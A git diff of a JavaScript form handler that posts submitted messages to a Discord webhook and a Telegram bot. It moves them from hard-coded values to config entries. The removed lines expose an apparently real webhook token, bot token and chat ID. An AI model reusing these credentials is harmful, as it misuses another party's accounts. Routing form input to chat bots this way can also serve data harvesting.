@@ -22,7 +22,7 @@ forms.addEventListener("submit", (e) => {
   }
 
   fetch(
-    "https://discord.com/api/webhooks/1400063263538151485/VtJ-lwEvkNZHfD0VU_BXAun4wsn04G0wXw0gc938TuenWnoD3V0KPxDUrQPCiXZJTCfU",
+    config.discord,
     {
       method: "POST",
       headers: {
@@ -33,14 +33,14 @@ forms.addEventListener("submit", (e) => {
   );
 
   fetch(
-    `https://api.telegram.org/bot8314619646:AAH94n8z_-4g9xMMQjHxqzrf2I8YZKYk_yA/sendMessage`,
+    `https://api.telegram.org/bot${config.telegram}/sendMessage`,
     {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        chat_id: 1277721806,
+        chat_id: config.chatID,
         text: message,
       }),
     }
